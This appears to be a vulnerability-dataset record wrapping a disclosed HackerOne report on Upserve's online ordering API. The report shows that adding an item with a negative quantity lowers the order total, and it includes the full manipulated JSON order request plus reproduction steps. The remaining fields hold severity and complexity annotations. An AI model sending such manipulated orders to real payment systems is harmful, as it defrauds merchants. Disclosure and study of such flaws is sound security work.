@@ -1,0 +1,38 @@
+{
+    "reported_to": "Upserve ",
+    "reported_by": "fuzz ",
+    "title": "OLO Total price manipulation using negative quantities",
+    "content": "\nManipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.\nIn the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).\nThe total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.\nCode 1.40 KiB\n1{\"card_uuid\": \"09ef096d-18d7-4cb4-83b7-5bd15d310aac\", \"city\": \"Cambridge\", \"email\": \"mthompson@hexwave.com\", \"first_name\": \"Matt\", \"last_name\": \"Thompson\", \"line1\": \"1230 Massachusetts Ave\", \"order\": {\"charges\": {\"items\": [{\"item_id\": \"254baa85-92c1-412e-a391-aaf44508d882\", \"name\": \"ChickenBurger\", \"price\": 1200, \"quantity\": 2, \"instructions\": \"\", \"total\": 1200, \"modifiers\": [], \"sides\": []}, {\"item_id\": \"9169bfc1-2ee1-455b-ad65-aeadd36f46eb\", \"name\": \"BreadPudding\", \"price\": 900, \"quantity\": -1, \"instructions\": \"\", \"total\": 900, \"modifiers\": [], \"sides\": []}], \"taxes\": 290, \"tip\": {\"amount\": 0}, \"total\": 1870}, \"confirmation_code\": \"upserve-hacker-cafe-32870\", \"fulfillment_info\": {\"customer\": {\"email\": \"mthompson@hexwave.com\", \"first_name\": \"Matt\", \"last_name\": \"Thompson\", \"phone\": \"555-555-5555\"}, \"delivery_info\": {\"address\": {\"address_line1\": \"1230 Massachusetts Ave\", \"address_line2\": null, \"city\": \"Cambridge\", \"country\": \"\", \"state\": \"MA\", \"zip_code\": \"02138\"}}, \"instructions\": \"\", \"type\": \"delivery\"}, \"id\": \"a168f311-f0bf-416c-b813-b277e3a7b5b3\", \"payments\": {\"payments\": [{\"amount\": 0, \"payment_type\": \"CREDIT\", \"tip_amount\": 0}], \"total\": 3190}, \"time_placed\": \"2018-06-11T20:48:51.313Z\"}, \"order_total\": 3190, \"phone_number\": \"555-555-5555\", \"state\": \"MA\", \"store_pretty_url\": \"upserve-lounge-test-providence-2\", \"submission_id\": \"a168f311-f0bf-416c-b813-b277e3a7b5b3\", \"text_alerts\": false, \"zip\": \"02138\"}\nImpact\nThe attacker can reduce the price of the order.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Business Logic Errors"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1562450340,
+    "report_url": "https://hackerone.com/reports/364843",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Manipulate the order request JSON by adding an item with a negative quantity."
+        ],
+        [
+            2,
+            "Submit the manipulated order request to observe the incorrect total price calculation."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to manipulate the total price of an order by adding an item with a negative quantity in the order request JSON. This results in the system incorrectly calculating the total price, effectively reducing the amount charged.",
+    "reason": "The attack is straightforward and involves a single component (the order request JSON). The manipulation is obvious once the tester considers the possibility of negative quantities, and there are no complex interactions or states involved.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
